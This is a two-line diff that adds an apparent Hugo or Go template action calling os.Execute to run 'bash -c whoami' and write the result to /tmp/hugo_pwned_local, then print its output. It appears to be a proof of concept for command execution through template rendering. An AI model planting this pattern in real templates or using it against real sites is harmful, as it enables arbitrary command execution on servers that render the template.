@@ -1,0 +1,2 @@
+{{ $x := os.Execute "bash" (slice "-c" "whoami > /tmp/hugo_pwned_local") }}
+{{ $x.Stdout }}
